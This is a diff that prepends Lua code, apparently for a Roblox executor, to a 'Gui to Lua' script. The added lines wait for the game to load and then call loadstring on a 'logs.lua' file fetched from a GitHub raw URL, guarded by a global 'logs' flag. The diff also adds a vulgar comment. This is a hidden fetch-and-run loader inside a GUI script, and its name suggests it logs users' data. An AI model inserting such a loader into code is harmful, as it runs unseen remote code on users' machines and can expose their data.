@@ -1,3 +1,18 @@
+print("loaded")
+local function waitForGameLoad()
+    repeat
+        wait()
+    until game:IsLoaded()
+end
+
+waitForGameLoad()
+--uh uh uh uh fuck me 
+getgenv().logs = true
+if getgenv().logs then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/anyahubs/CommanderX/main/logs.lua", true))()
+    getgenv().logs = false
+end
+print("loaded")
 -- Gui to Lua
 -- Version: 3.6
 
